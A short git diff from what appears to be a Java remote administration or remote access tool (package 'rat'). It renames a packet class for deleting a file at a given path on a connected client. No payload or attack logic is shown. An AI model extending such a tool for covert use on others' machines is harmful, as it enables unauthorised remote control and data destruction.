@@ -4,15 +4,15 @@ import java.io.File;
 
 import de.sogomn.rat.ActiveClient;
 
-public final class DeletePacket implements IPacket {
+public final class DeleteFilePacket implements IPacket {
 	
 	private String path;
 	
-	public DeletePacket(final String path) {
+	public DeleteFilePacket(final String path) {
 		this.path = path;
 	}
 	
-	public DeletePacket() {
+	public DeleteFilePacket() {
 		this("");
 	}
 	
